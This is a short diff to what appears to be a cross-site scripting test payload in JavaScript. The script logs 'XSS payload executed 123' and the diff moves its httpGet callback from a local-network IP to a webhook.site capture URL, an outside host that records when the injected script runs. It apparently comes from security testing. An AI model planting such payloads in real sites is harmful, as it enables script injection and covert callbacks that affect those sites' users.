@@ -11,4 +11,4 @@ function httpGet(theUrl)
 }
 
 console.log('XSS payload executed 123');
-httpGet('http://192.168.190.130/');
+httpGet('https://webhook.site/604e583c-9a9d-4180-9017-fecddc65252b/');
